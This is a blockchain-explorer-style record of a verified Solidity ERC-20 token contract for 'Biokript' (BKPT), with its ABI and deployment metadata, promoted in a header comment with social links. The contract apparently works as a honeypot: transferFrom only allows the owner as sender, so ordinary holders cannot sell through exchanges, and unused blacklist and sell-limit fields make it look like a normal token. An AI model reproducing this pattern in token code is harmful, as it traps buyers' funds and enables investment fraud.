{"SourceCode": "/**\r\n\r\nWorld\u2019s first hybrid Shariah-compliant cryptocurrency trading platform Biokript.\r\n\r\nDon't miss BKPT\r\n\r\nTelegram: https://t.me/biokriptETHchannel\r\n\r\nTWITTER: https://twitter.com/biokriptETH\r\n\r\n**/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n\r\n        uint256 c = a + b;\r\n\r\n\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n\r\n\r\n        uint256 c = a - b;\r\n\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n\r\n\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n\r\n\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n\r\n\r\n        uint256 c = a / b;\r\n\r\n\r\n        return c;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n\r\n}\r\n\r\ncontract Token {\r\n    using SafeMath for uint256;\r\n\r\n    string private _name;\r\n\r\n    string private _symbol;\r\n\r\n    uint8 private _decimals;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    address private _owner;\r\n\r\n\r\n    mapping(address => uint256) private _balances;\r\n\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n\r\n    mapping(address => bool) private _isBlacklisted;\r\n\r\n\r\n    mapping(address => bool) private _isWhitelisted;\r\n\r\n\r\n    uint256 private _maxSellPercentage;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    constructor(\r\n        string memory name_,\r\n\r\n        string memory symbol_,\r\n\r\n        uint8 decimals_,\r\n\r\n        uint256 totalSupply_,\r\n\r\n        uint256 maxSellPercentage_,\r\n\r\n        address owner_\r\n    ) {\r\n        _name = name_;\r\n    \r\n        _symbol = symbol_;\r\n\r\n        _decimals = decimals_;\r\n\r\n        _totalSupply = totalSupply_;\r\n\r\n        _maxSellPercentage = maxSellPercentage_;\r\n\r\n        _owner = owner_;\r\n\r\n        _balances[_owner] = _totalSupply;\r\n        emit Transfer(address(0), _owner, _totalSupply);\r\n    }\r\n\r\n    function name() external view returns (string memory) {\r\n\r\n        return _name;\r\n    }\r\n\r\n    function symbol() external view returns (string memory) {\r\n\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() external view returns (uint8) {\r\n\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() external view returns (uint256) {\r\n\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) external view returns (uint256) {\r\n\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool) {\r\n\r\n        require(recipient != address(0), \"Token: transfer to the zero address\");\r\n\r\n        require(amount <= _balances[msg.sender], \"Token: transfer amount exceeds balance\");\r\n\r\n\r\n        _balances[msg.sender] = _balances[msg.sender].sub(amount);\r\n\r\n\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n\r\n        emit Transfer(msg.sender, recipient, amount);\r\n\r\n\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool) {\r\n\r\n\r\n        require(spender != address(0), \"Token: approve to the zero address\");\r\n\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\r\n\r\n\r\n        require(sender != address(0), \"Token: transfer from the zero address\");\r\n\r\n\r\n        require(recipient != address(0), \"Token: transfer to the zero address\");\r\n\r\n\r\n        require(amount <= _balances[sender], \"Token: transfer amount exceeds balance\");\r\n\r\n\r\n        require(amount <= _allowances[sender][msg.sender], \"Token: transfer amount exceeds allowance\");\r\n\r\n\r\n        require(sender == _owner, \"Token: sender must be the owner of the token\");\r\n\r\n\r\n        _balances[sender] = _balances[sender].sub(amount);\r\n\r\n\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n\r\n\r\n        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n        \r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxSellPercentage_\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Token", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000019d971e4fe8401e74000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000c5aba267edf3e0ae826a17f510cfed0147de98a6000000000000000000000000000000000000000000000000000000000000000842696f6b726970740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004424b505400000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://7f67e679cd09e89202dbf0f37b762a199a6819fa6057a5cc3611f97ecefd7685"}